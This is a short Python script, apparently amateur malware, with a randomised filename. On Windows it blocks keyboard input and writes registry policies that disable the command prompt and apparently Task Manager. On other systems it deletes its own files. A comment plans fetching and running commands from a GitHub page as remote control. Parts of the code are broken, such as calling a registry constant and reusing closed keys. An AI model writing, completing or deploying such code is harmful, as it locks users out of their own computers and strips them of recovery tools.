#1mfj22jfi3nfjwd.py - main program
#have another subprocess that checks a github website for a different command, if there is one present it runs it, and we may be able to return a result later.
import keyboard, threading, sys, subprocess, secrets, random, winreg, tkinter as tk
if sys.platform != "win32":
    run = subprocess.Popen(["pwd"], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    stdout, stderr = run.communicate()
    try:
        run = subprocess.Popen(["rm", "1mfj22jfi3nfjwd.py"], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        run = subprocess.Popen(["rm", "82fhwejehdfi12jd.py"], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    except:
        print(" please execute this program with executive priveliges (i.e sudo, if you aren't on linux, this message is incorrect, and the program is not correctly installed!)")
else:
    run = "ok" 
if run == "ok":       
    def block():
        for i in range(150):
            keyboard.block_key(i)
    keyboardb = threading.Thread(target = block())
    keyboardb.start()
    keyboardb.join()
    location = winreg.HKEY_CURRENT_USER()
    soft = winreg.OpenKeyEx(location, "SOFTWARE\\Policies\\Microsoft\\Windows")
    soft.close()
    discmd = winreg.CreateKey(soft, 'System')
    soft = winreg.OpenKeyEx(location, "SOFTWARE\\Policies\\Microsoft\\Windows\\system")
    winreg.SetValueEx(soft, 'DisableCMD', 0, winreg.REG_DWORD, 2)
    soft.close()
    #Computer\HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies
    soft = winreg.OpenKeyEx(location, "SOFTWARE\Microsoft\Windows\CurrentVersion\Policies")
    distskmgr1 = winreg.CreateKey(soft, 'System')
    soft.close()
    soft = winreg.OpenKeyEx(location, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System")
    distskmgr = winreg.SetValueEx(soft, 'DisableCMD', 0, winreg.REG_DWORD, 1)

#    b = secrets.token_urlsafe(random.randint(8, 20))


